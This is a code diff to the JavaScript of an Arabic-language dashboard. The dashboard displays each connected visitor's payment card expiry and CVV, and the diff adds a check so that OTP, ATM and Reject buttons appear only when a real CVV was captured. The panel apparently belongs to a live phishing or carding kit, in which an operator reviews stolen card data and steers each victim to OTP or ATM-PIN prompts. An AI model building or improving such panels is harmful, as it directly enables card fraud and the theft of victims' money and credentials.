@@ -2080,12 +2080,14 @@
               html += '<div class="text-right"><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
               html += '<div class="text-left"><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-lg">' + card.cvv + '</span></div>';
               html += '</div>';
-              // Action buttons for credit card
+              // Action buttons for credit card - only show when CVV is available (not N/A)
+              if (card.cvv && card.cvv !== 'N/A' && card.cvv !== 'n/a') {
               html += '<div class="flex gap-2 mt-3">';
               html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
               html += '<button onclick="cardActionATM(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
               html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
+              }
               html += '</div>';
               html += '</div>';
             }
